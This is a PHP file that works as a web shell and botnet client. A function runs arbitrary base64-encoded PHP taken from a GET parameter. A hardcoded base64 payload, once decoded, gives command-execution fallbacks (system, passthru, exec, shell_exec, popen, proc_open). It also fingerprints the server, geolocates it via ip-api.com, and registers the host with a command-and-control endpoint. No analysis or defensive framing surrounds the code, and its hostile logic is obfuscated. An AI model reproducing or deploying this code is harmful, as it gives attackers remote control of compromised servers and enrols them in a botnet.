<?php
function doDeclaration(){
	global  $_SERVER ; 
	if(strlen($_SERVER['HTTP_HOST']) != 0)$domaine=$_SERVER['HTTP_HOST'];
    else $domaine = $_SERVER['SERVER_NAME'] ;
    $path = $domaine.$_SERVER['SCRIPT_NAME'];
}
function execPHP(){
	GLOBAL $_POST ;
	if(isset($_GET['PHPCOMM'])){
		ob_flush();ob_start();$file = tempnam(sys_get_temp_dir(), 'GK').".php";
		file_put_contents($file, '<?'.base64_decode(trim($_GET['PHPCOMM'])).'?>');
		include($file);echo ob_get_clean();unlink($file);ob_end_flush();
	}

}
$_GET['PHPCOMM'] = 'CmZ1bmN0aW9uIHNlbmRUb01hc3RlcigkZGF0YSl7CiAgICBHTE9CQUwgJE1BU1RFUkxJTksgOwogICAgJGNvbnRlbnQgPSBqc29uX2VuY29kZSgkZGF0YSk7CiAgICAkY3VybCA9IGN1cmxfaW5pdCgkTUFTVEVSTElOSy4iP2FjdGlvbj1ERUNMQVJFIik7CiAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9IRUFERVIsIGZhbHNlKTsKICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsKICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX0hUVFBIRUFERVIsYXJyYXkoIkNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vanNvbiIpKTsKICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1BPU1QsIHRydWUpOwogICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUE9TVEZJRUxEUywgJGNvbnRlbnQpOwogICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjdXJsKTsgICAKICAgIGN1cmxfY2xvc2UoJGN1cmwpOwogICAgcmV0dXJuICRyZXNwb25zZTsgCn0KCmZ1bmN0aW9uIGdldE9zKCl7CiAgICBpZihzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsIDAsIDMpKSA9PT0gIldJTiIpewogICAgICAgIHJldHVybiAiV0lOIiA7CiAgICB9CiAgICBlbHNlIGlmKHN0cnRvdXBwZXIoc3Vic3RyKFBIUF9PUywgMCwgNSkpID09PSAiTFVOSVgiKSB7CgogICAgICAgIHJldHVybiAiTFVOSVgiOwogICAgfQogICAgZWxzZSB7CiAgICAgICAgJG9zID0gZXhwbG9kZSgiICIsUEhQX09TKTsKICAgICAgICByZXR1cm4gICRvc1swXTsKICAgIH0KfQpmdW5jdGlvbiBleGVjQ21kKCRjbWQpewogICAgaWYoZnVuY3Rpb25fZXhpc3RzKCJzeXN0ZW0iKSkgCiAgICB7QG9iX3N0YXJ0KCk7QHN5c3RlbSgkY21kKTskaGZwID0gQG9iX2dldF9jb250ZW50cygpOyRoZnAgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7QG9iX2VuZF9jbGVhbigpOwogICAgcmV0dXJuICRoZnA7fSAKICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoIgogICAgCXBhc3N0aHJ1Iikpe0BvYl9zdGFydCgpO0BwYXNzdGhydSgkY21kKTskaGZwID0gQG9iX2dldF9jb250ZW50cygpO0BvYl9lbmRfY2xlYW4oKTtyZXR1cm4gJGhmcDt9IAogICAgZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygiZXhlYyIpKSB7QGV4ZWMoJGNtZCwkcmVzdWx0cyk7JGhmcCA9ICIiO2ZvcmVhY2goJHJlc3VsdHMgYXMgJHJlc3VsdCl7JGhmcCAuPSAkcmVzdWx0O30gcmV0dXJuICRoZnA7fSAKICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoInNoZWxsX2V4ZWMiKSl7JGhmcCA9IEBzaGVsbF9leGVjKCRjbWQpO3JldHVybiAkaGZwO30KICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoInBvcGVuIikpeyRmcCA9IHBvcGVuKCRjbWQsICJyIik7ICRoZnAgPSBmcmVhZCgkZnAsIDEwMjQpOyBwY2xvc2UoJGZwKTsgcmV0dXJuICRoZnA7fQogICAgZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygicHJvY19vcGVuIikpeyRwcm9jPXByb2Nfb3BlbigkY21kLCBhcnJheShhcnJheSgicGlwZSIsInIiKSwgYXJyYXkoInBpcGUiLCJ3IiksYXJyYXkoInBpcGUiLCJ3IikgKSwKICAgICRwaXBlcyk7cmV0dXJuIHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTt9CiAgICBlbHNlewogICAgICAgIHJldHVybiBmYWxzZSA7CiAgICB9CiAgICB9CgpmdW5jdGlvbiBmaWxlQ3VybCgkdXJsKXsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwogICAgJG91dHB1dCA9IGN1cmxfZXhlYygkY2gpOwogICAgY3VybF9jbG9zZSgkY2gpOwogICAgcmV0dXJuICRvdXRwdXQ7Cn0KCglmdW5jdGlvbiBnZXRDbigpewogICAgJHF1ZXJ5ID0gQHVuc2VyaWFsaXplKGZpbGVDdXJsKCJodHRwOi8vaXAtYXBpLmNvbS9waHAvIikpOwogICAgJGNuID0gc3RydG9sb3dlcigkcXVlcnlbImNvdW50cnlDb2RlIl0pOwogICAgcmV0dXJuICRjbiA7Cn0KCmZ1bmN0aW9uIGdldEJvdERldGFpbHMoKXsKCSRkZXRhaWxzID0gIGFycmF5KCk7CmlmKHN0cmxlbigkX1NFUlZFUlsiSFRUUF9IT1NUIl0pICE9IDApJGRvbWFpbmUgPSAgJF9TRVJWRVJbIkhUVFBfSE9TVCJdOwplbHNlICRkb21haW5lID0gJF9TRVJWRVJbIlNFUlZFUl9OQU1FIl0gOwoKaWYoc3RybGVuKCRfU0VSVkVSWyJTRVJWRVJfQUREUiJdKSAhPSAwKSRpcCA9ICAkX1NFUlZFUlsiU0VSVkVSX0FERFIiXTsKZWxzZXsKICAgICRob3N0PSBnZXRob3N0bmFtZSgpOwogICAgJGlwID0gZ2V0aG9zdGJ5bmFtZSgkaG9zdCk7CiB9CiBpZihzdHJsZW4oJF9TRVJWRVJbIkhUVFBfSE9TVCJdKSAhPSAwKSRkb21haW5lPSRfU0VSVkVSWyJIVFRQX0hPU1QiXTsKICAgIGVsc2UgJGRvbWFpbmUgPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXSA7CiAgICAkcGF0aCA9ICRkb21haW5lLiIvIi5iYXNlbmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0sICIucGhwIikuIi5waHAiOwogCSAKIAkgJGt2ID0gZXhwbG9kZSgiICIscGhwX3VuYW1lKCIiKSkgOwogICAgICRrdiA9ICRrdltjb3VudCgka3YpLTFdOwoJICRkZXRhaWxzWyJkb21haW5lIl0gPSAkZG9tYWluZSA7CgkgJGRldGFpbHNbImlwIl0gPSAkaXA7CgkgJGRldGFpbHNbImxpbmsiXSA9ICRwYXRoOwoJICRkZXRhaWxzWyJjbiJdID0gZ2V0Q24oKTsKCSAkZGV0YWlsc1sib3MiXSA9IGdldE9zKCk7CgkgJGRldGFpbHNbInBocCJdID0gUEhQX1ZFUlNJT047CgkgJGRldGFpbHNbImtlcm5lbCJdID0gc3Vic3RyKCRrdiwgMCw1KTs7CgkgJGRldGFpbHNbInNvY2tldCJdID0gZnVuY3Rpb25fZXhpc3RzKCJmc29ja29wZW4iKTsKCSAkZGV0YWlsc1siY21kIl0gPSAoc3RybGVuKGV4ZWNDbWQoImxzIikpK3N0cmxlbihleGVjQ21kKCJESVIiKSk+MCk7CgkgcmV0dXJuICRkZXRhaWxzOwp9CQokTUFTVEVSTElOSyA9ICJsb2NhbGhvc3QvbS9hcGkucGhwIiA7JGRhdGEgPSBnZXRCb3REZXRhaWxzKCkgOyRkYXRhWyJhY3Rpb24iXT0iREVDTEFSRSI7ZWNobyAgc2VuZFRvTWFzdGVyKCRkYXRhKSAg';
execPHP();
?>